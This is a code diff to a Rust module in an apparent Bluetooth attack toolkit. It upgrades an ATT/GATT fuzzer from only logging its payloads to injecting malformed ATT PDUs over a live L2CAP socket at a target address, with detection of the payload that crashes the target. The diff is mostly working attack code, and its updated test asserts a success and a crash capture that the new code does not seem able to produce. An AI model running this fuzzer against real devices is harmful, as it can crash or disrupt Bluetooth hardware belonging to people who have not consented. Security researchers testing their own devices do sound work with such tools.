@@ -6,7 +6,7 @@
 
 use std::time::Instant;
 
-use super::hci::HciSocket;
+use super::l2cap_socket::L2capSocket;
 use super::{BtAttackResult, BtAttackType, BtCapture};
 
 // ATT opcodes
@@ -16,8 +16,8 @@ const ATT_FIND_INFO_REQ: u8 = 0x04;
 const ATT_READ_BLOB_REQ: u8 = 0x0C;
 const ATT_PREPARE_WRITE_REQ: u8 = 0x16;
 
-/// ATT/GATT fuzzer: generates malformed ATT PDUs to stress the target's
-/// GATT server.
+/// ATT/GATT fuzzer: injects malformed ATT PDUs over a real L2CAP socket to
+/// stress the target's GATT server.
 ///
 /// Fuzz vectors:
 /// 1. Read By Type with invalid handle range (start > end)
@@ -26,41 +26,70 @@ const ATT_PREPARE_WRITE_REQ: u8 = 0x16;
 /// 4. Read Blob with maximum offset (0xFFFF)
 /// 5. Prepare Write with oversized value (overflow attempt)
 ///
-/// NOTE: Proper ATT injection requires an ACL socket (not implemented yet).
-/// The previous implementation incorrectly sent ATT PDUs as Write RAM
-/// (vendor 0x4C) parameters, causing the first 4 bytes of the payload to be
-/// interpreted as a RAM address. For now, payloads are generated and reported
-/// as captures for logging/analysis but not injected on the wire.
-pub fn run(_hci: &HciSocket, target_addr: &str) -> BtAttackResult {
+/// `addr_type`: 0 = BDADDR_BREDR, 1 = BDADDR_LE_PUBLIC, 2 = BDADDR_LE_RANDOM.
+pub fn run(target_addr: &str, addr_type: u8) -> BtAttackResult {
     let start = Instant::now();
     log::info!("att_fuzz: targeting {} with malformed ATT PDUs", target_addr);
 
+    // Open ATT fixed channel (PSM=0, CID=0x0004).
+    let sock = match L2capSocket::connect(target_addr, addr_type, 0, 0x0004) {
+        Ok(s) => s,
+        Err(e) => {
+            return BtAttackResult {
+                attack_type: BtAttackType::AttGattFuzz,
+                target_address: target_addr.to_string(),
+                target_name: None,
+                success: false,
+                capture: None,
+                error: Some(format!("L2CAP connect failed: {}", e)),
+                timestamp: start,
+            };
+        }
+    };
+
     let fuzz_vectors = build_fuzz_vectors();
-    let mut captures: Vec<Vec<u8>> = Vec::new();
+    let mut sent_count: usize = 0;
+    let mut crash_trigger: Option<Vec<u8>> = None;
 
     for (name, payload) in &fuzz_vectors {
-        // Log the fuzz payload for offline analysis — do NOT send via Write RAM.
         log::info!(
-            "att_fuzz: generated {} ({} bytes): {:02x?}",
+            "att_fuzz: sending {} ({} bytes): {:02x?}",
             name,
             payload.len(),
             &payload[..payload.len().min(32)]
         );
-        captures.push(payload.clone());
+
+        match sock.send(payload) {
+            Ok(_) => {
+                sent_count += 1;
+                // Short receive to detect crash / connection drop.
+                let mut resp = [0u8; 256];
+                if let Err(e) = sock.recv(&mut resp, 1000) {
+                    log::info!("att_fuzz: recv failed after {} (possible crash): {}", name, e);
+                    crash_trigger = Some(payload.clone());
+                }
+            }
+            Err(e) => {
+                // Send failure likely means the target crashed / dropped the link.
+                log::info!("att_fuzz: send failed on {} (possible crash): {}", name, e);
+                crash_trigger = Some(payload.clone());
+                break;
+            }
+        }
     }
 
-    let capture = captures.first().map(|trigger| BtCapture::FuzzCrash {
+    let capture = crash_trigger.map(|trigger| BtCapture::FuzzCrash {
         address: target_addr.to_string(),
-        trigger: trigger.clone(),
+        trigger,
     });
 
     BtAttackResult {
         attack_type: BtAttackType::AttGattFuzz,
         target_address: target_addr.to_string(),
         target_name: None,
-        success: false,
+        success: sent_count > 0,
         capture,
-        error: Some("payloads generated but not injected (needs ACL socket)".into()),
+        error: None,
         timestamp: start,
     }
 }
@@ -159,10 +188,9 @@ mod tests {
     #[test]
     #[cfg(not(target_os = "linux"))]
     fn test_run_stub() {
-        let hci = HciSocket::open(0).unwrap();
-        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
+        let result = run("AA:BB:CC:DD:EE:FF", 1);
         assert_eq!(result.attack_type, BtAttackType::AttGattFuzz);
-        // Payloads are generated and captured (but not sent) → success=true
         assert!(result.success);
+        assert!(result.capture.is_some());
     }
 }
